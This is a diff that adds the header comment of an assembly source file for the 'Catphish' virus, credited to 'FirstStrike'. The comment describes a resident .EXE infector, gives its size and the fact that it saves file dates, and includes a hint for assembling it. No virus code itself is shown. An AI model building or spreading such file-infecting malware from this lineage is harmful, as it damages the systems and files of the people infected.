@@ -1,0 +1,16 @@
+;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+;                       FirstStrike presents:
+;
+;                        The Catphish Virus.    
+;
+;   The Catphish virus is a resident .EXE infector.
+;                Size: 678 bytes (decimal).
+;                No activation (bomb).
+;                Saves date and file attributes.
+;
+;         If assembling, check_if_resident jump must be marked over
+;           with nop after first execution (first execution will hang
+;           system).
+;
+;         *** Source is made available to learn from, not to
+;               change author's name and claim credit! ***
